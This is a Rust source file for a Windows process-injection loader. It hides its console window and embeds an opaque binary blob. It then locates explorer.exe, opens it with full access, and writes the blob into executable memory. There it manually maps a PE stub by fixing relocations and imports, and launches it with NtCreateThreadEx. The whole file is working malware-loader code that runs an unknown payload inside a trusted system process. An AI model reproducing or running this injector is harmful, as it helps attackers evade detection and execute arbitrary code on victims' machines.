#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use goblin::pe::{
    PE, 
    import::ImportDirectoryEntry,
};
use scroll::{ctx::TryFromCtx, Endian};
use std::{ffi::c_void, ptr, u32};
use windows::{
    core::PCSTR,
    Win32::{
        Foundation::{
            CloseHandle,
            HANDLE, 
            NTSTATUS
        },
        System::{
            LibraryLoader::{
                GetModuleHandleA, 
                GetProcAddress
            },
            Diagnostics::{
                Debug::WriteProcessMemory,
                ToolHelp::{
                    CreateToolhelp32Snapshot, 
                    Process32FirstW, 
                    Process32NextW, 
                    TH32CS_SNAPPROCESS,
                    PROCESSENTRY32W,
                },
            },
            Memory::{
                VirtualAllocEx, 
                MEM_COMMIT, 
                MEM_RESERVE, 
                PAGE_EXECUTE_READWRITE
            },
            Threading::{
                OpenProcess, 
                WaitForSingleObject,
                PROCESS_ALL_ACCESS,
            },
        },
    },
};

#[link(name = "ntdll")]
unsafe extern "system" {
    pub fn NtCreateThreadEx(
        thread_handle: *mut HANDLE,
        desired_access: u32,
        object_attributes: *mut c_void,
        process_handle: HANDLE,
        start_address: *mut c_void,
        parameter: *mut c_void,
        create_flags: u32,
        zero_bits: usize,
        stack_size: usize,
        maximum_stack_size: usize,
        attribute_list: *mut c_void,
    ) -> NTSTATUS;
}

const BLOB: &[u8] = include_bytes!("blob.bin");

fn rva_to_offset(pe: &PE, rva: usize) -> Option<usize> {
    for section in &pe.sections {
        let virtual_address = section.virtual_address as usize;
        let virtual_size = section.virtual_size as usize;
        let range = virtual_address..(virtual_address + virtual_size);
        if range.contains(&rva) {
            let delta = rva - virtual_address;
            let file_off = section.pointer_to_raw_data as usize + delta;
            return Some(file_off);
        }
    };
    None
}

unsafe fn manual_map_pe(
    h_proc: HANDLE,
    remote_base: usize,
    stub: &[u8],
) -> windows::core::Result<()> {
    let pe = PE::parse(stub).expect("stub not PE");
    let optional_header = pe.header.optional_header.as_ref().unwrap();
    // Relocations
    if let Some(reloc_dir) = optional_header.data_directories.get_base_relocation_table() { 
        let delta = remote_base as isize - optional_header.windows_fields.image_base as isize;
        let mut offset = rva_to_offset(&pe, reloc_dir.virtual_address as usize).expect("Failed to convert rva to offset");
        let end = offset + reloc_dir.size as usize;
        while offset < end {
            let page_rva = u32::from_le_bytes(stub[offset..][..4].try_into().unwrap()) as usize;
            let block_sz = u32::from_le_bytes(stub[offset+4..][..4].try_into().unwrap()) as usize;

            let count    = (block_sz - 8) / 2;
            let mut ent  = offset + 8;

            for _ in 0..count {
                let raw = u16::from_le_bytes(stub[ent..][..2].try_into().unwrap());
                ent += 2;

                if raw >> 12 != 10 { continue } // skip other types
                let va_remote = remote_base + page_rva + ((raw & 0x0FFF) as usize);
                let old = u64::from_le_bytes(
                    stub[ rva_to_offset(&pe, page_rva + (raw & 0x0FFF) as usize).unwrap() .. ][..8].try_into().unwrap()
                );
                let patched = (old as isize + delta) as u64;
                let _ = unsafe { WriteProcessMemory(h_proc, va_remote as _, &patched as *const _ as _, 8, None)? };
            }
            offset += block_sz;
        }
    }
    // IAT fix
    if let Some(imp_dir) = optional_header.data_directories.get_import_table() {
        let mut imp_off = rva_to_offset(&pe, imp_dir.virtual_address as usize).expect("Failed to convert RVA to offset");
        let end_imp = imp_off + imp_dir.size as usize;

        while imp_off < end_imp {
            let (desc, desc_sz) = ImportDirectoryEntry::try_from_ctx(&stub[imp_off..], Endian::Little).expect("import desc");
            if desc.is_null() { break; }

            let name_off = rva_to_offset(&pe, desc.name_rva as usize).expect("dll name rva");
            unsafe {
                let dll_name = std::ffi::CStr::from_ptr(&stub[name_off] as *const u8 as *const i8);
                let h_mod = GetModuleHandleA(PCSTR(dll_name.as_ptr() as _)).expect("GetModuleHandleA failed");

                let mut lookup_rva = if desc.import_lookup_table_rva == 0 {
                    desc.import_address_table_rva
                } else {
                    desc.import_lookup_table_rva
                } as usize;
                let mut iat_rva = desc.import_address_table_rva as usize;

                loop {
                    let thunk_off = rva_to_offset(&pe, lookup_rva).unwrap();
                    let thunk_val =
                        u64::from_le_bytes(stub[thunk_off..][..8].try_into().unwrap());
                    if thunk_val == 0 { break; }

                    let func = if (thunk_val & (1 << 63)) != 0 {
                        let ord = (thunk_val & 0xFFFF) as u16;
                        GetProcAddress(h_mod, PCSTR(ord as usize as _))
                    } else {
                        let name_rva = (thunk_val & 0x7FFF_FFFF_FFFF_FFFF) as usize;
                        let hint_name_off = rva_to_offset(&pe, name_rva + 2).expect("Failed to convert RVA to offset");
                        let fn_name = std::ffi::CStr::from_ptr(&stub[hint_name_off] as *const u8 as *const i8);
                        GetProcAddress(h_mod, PCSTR(fn_name.as_ptr() as _))
                    };

                    let iat_remote = (remote_base + iat_rva) as *mut c_void;
                    WriteProcessMemory(
                        h_proc,
                        iat_remote,
                        &func as *const _ as _,
                        8,
                        None,
                    )?;

                    lookup_rva += 8;
                    iat_rva    += 8;
                }
                imp_off += desc_sz;
            }
        }
    }

    Ok(())
}

fn get_explorer_pid() -> Option<u32> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).expect("Snapshot creation failed.");

        let mut entry = PROCESSENTRY32W {
            dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
            ..std::mem::zeroed()
        };
        assert!(Process32FirstW(snapshot, &mut entry).is_ok(), "VirtualAllocEx failed");

        loop {
            let len = entry
                .szExeFile
                .iter()
                .position(|&c| c == 0)
                .unwrap_or(entry.szExeFile.len());
            let wide_slice = &entry.szExeFile[..len];
            let exe_name = String::from_utf16_lossy(wide_slice)
                .to_ascii_lowercase();

            if exe_name == "explorer.exe" {
                let _ = CloseHandle(snapshot);
                return Some(entry.th32ProcessID);
            }

            if Process32NextW(snapshot, &mut entry).is_err() {
                break;
            }
        }

        let _ = CloseHandle(snapshot);
        None
    }
}

fn main() -> windows::core::Result<()> {
    unsafe {
        let size_stub    = u32::from_le_bytes(BLOB[0..4].try_into().unwrap()) as usize;
        let entry_off    = u32::from_le_bytes(BLOB[8..12].try_into().unwrap()) as usize;
        let target_pid = get_explorer_pid().expect("Failed to get explorer pid");
        let h_process = OpenProcess(PROCESS_ALL_ACCESS, false, target_pid)?;
        let remote_addr = VirtualAllocEx(
            h_process,
            None,
            BLOB.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        WriteProcessMemory(
            h_process,
            remote_addr,
            BLOB.as_ptr() as _,
            BLOB.len(),
            None,
        )?;
        let base_stub_remote = remote_addr as usize + 12;
        let _ = manual_map_pe(h_process, base_stub_remote, &BLOB[12..12+size_stub])?;
        let remote_stub = (remote_addr as usize + 12 + entry_off) as *mut c_void;
        let mut h_thread = HANDLE(std::ptr::null_mut());
        let status = NtCreateThreadEx(
            &mut h_thread,
            0x1FFFFF,
            ptr::null_mut(),
            h_process,
            remote_stub,
            remote_addr as *mut c_void,
            0, 0, 0, 0,
            ptr::null_mut(),
        );
        assert!(status.0 == 0, "NtCreateThreadEx failed: 0x{:X}", status.0);

        WaitForSingleObject(h_thread, u32::MAX);
        let _ = CloseHandle(h_thread);
        let _ = CloseHandle(h_process);
    }
    Ok(())
}
